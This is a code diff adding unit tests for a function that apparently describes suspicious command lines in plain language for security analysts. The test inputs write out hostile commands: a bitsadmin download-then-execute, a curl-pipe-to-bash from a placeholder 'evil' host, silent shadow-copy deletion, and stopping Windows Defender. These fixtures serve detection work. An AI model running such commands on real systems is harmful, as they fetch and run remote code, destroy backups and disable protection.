@@ -385,6 +385,83 @@ def test_classify_single_var_interpolation_does_not_fire():
     assert "defense_evasion" not in names
 
 
+# ── Mechanics-first paragraph 1: combined "what it does" + analyst story ────
+
+from app.story import _describe_mechanics
+
+
+def test_mechanics_describes_bitsadmin_download_then_execute():
+    result = {
+        "command": (
+            'bitsadmin /transfer "WindowsUpdate" /download /priority normal '
+            "hxxp://update-svc[.]xyz/patch.exe C:\\Windows\\Temp\\patch.exe "
+            "& C:\\Windows\\Temp\\patch.exe /quiet"
+        ),
+        "binaries_in_command": [{"name": "bitsadmin.exe"}, {"name": "patch.exe"}],
+    }
+    out = _describe_mechanics(result)
+    assert out is not None
+    # Mentions BITS, the URL host, the target path, and the chained execution.
+    assert "BITS" in out
+    assert "update-svc.xyz" in out
+    assert "patch.exe" in out
+    assert "then" in out.lower()
+    # Grammar guard: never "to downloads" / "to runs" — base form after "to".
+    assert "to downloads" not in out
+    assert "to deletes" not in out
+    assert "to executes" not in out
+
+
+def test_mechanics_curl_pipe_bash_stays_one_segment():
+    # The `|` operator must NOT split the pipeline — curl's own pipe-aware
+    # verb rule needs to see the whole command.
+    result = {
+        "command": "curl -fsSL https://cdn.evil.xyz/install.sh | bash -s -- --no-verify",
+        "binaries_in_command": [{"name": "curl.exe"}, {"name": "bash"}],
+    }
+    out = _describe_mechanics(result)
+    assert out is not None
+    assert "pipe" in out.lower()
+    assert "cdn.evil.xyz" in out
+
+
+def test_mechanics_vssadmin_silent_shadow_delete():
+    out = _describe_mechanics({
+        "command": "vssadmin delete shadows /all /quiet",
+        "binaries_in_command": [{"name": "vssadmin.exe"}],
+    })
+    assert out is not None
+    assert "Shadow" in out
+    assert "silently" in out.lower()
+
+
+def test_mechanics_net_stop_names_the_service():
+    out = _describe_mechanics({
+        "command": "net stop WinDefend",
+        "binaries_in_command": [{"name": "net.exe"}],
+    })
+    assert out is not None
+    assert "WinDefend" in out
+
+
+def test_mechanics_generic_fallback_does_not_duplicate_binary_name():
+    out = _describe_mechanics({
+        "command": "myapp.exe --do-something --flag",
+        "binaries_in_command": [{"name": "myapp.exe"}],
+    })
+    assert out is not None
+    # The args field must NOT repeat "myapp.exe" inside its own value.
+    assert out.count("myapp.exe") == 1
+
+
+def test_mechanics_no_binaries_returns_none():
+    out = _describe_mechanics({
+        "command": "echo hello",
+        "binaries_in_command": [],
+    })
+    assert out is None  # Caller falls back to jargon-style P1.
+
+
 def test_story_acknowledges_obfuscation_when_no_threats():
     # Backtick-obfuscated benign command — no threat classes, no LOLBAS hit,
     # but a decoded layer exists. Paragraph 1 must NOT say "no malicious
